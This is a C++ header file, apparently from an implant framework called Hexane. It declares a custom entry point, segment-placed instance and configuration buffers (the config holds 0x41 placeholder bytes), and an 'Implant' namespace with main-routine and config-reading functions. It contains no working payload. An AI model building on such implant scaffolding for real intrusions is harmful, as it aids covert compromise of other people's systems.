#ifndef HEXANE_CORELIB_BASE_HPP
#define HEXANE_CORELIB_BASE_HPP
#include <core/corelib.hpp>

#pragma comment(linker, "/ENTRY:Start")
__segment(E) uint8_t __instance[sizeof(_hexane)]    = { };
__segment(F) uint8_t __config[DEFAULT_BUFFLEN]      = { 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41 };

EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);
namespace Implant {
    FUNCTION VOID MainRoutine();
    FUNCTION VOID ReadConfig();
}
#endif //HEXANE_CORELIB_BASE_HPP